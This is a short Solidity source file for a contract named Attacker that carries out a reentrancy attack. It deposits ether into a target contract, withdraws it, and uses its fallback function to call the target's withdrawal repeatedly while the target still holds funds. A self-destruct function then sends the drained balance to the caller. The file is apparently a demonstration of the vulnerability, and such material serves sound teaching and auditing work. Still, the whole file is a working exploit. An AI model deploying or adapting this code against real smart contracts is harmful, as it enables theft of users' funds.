pragma solidity ^0.4.15;

contract Attacker {
  AttackeeContract public attackee;

  event LogAttackComplete(uint balance);

  /// @dev Contract constructor
  /// @param _attackee The address of the contract to attack
  function Attacker (address _attackee) {
    attackee = AttackeeContract(_attackee);
  }

  /// @dev Contract fallback
  /// ATTACK OCCURS HERE
  function () payable {
    if (attackee.balance >= msg.value)
      attackee.get();

    LogAttackComplete(this.balance);
  }

  /// @dev Initiate the attack
  function collect() external payable {
    attackee.put.value(msg.value)();
    attackee.get();
  }

  /// @dev Allocate funds to a user owned address
  function kill() external {
    suicide(msg.sender);
  }
}
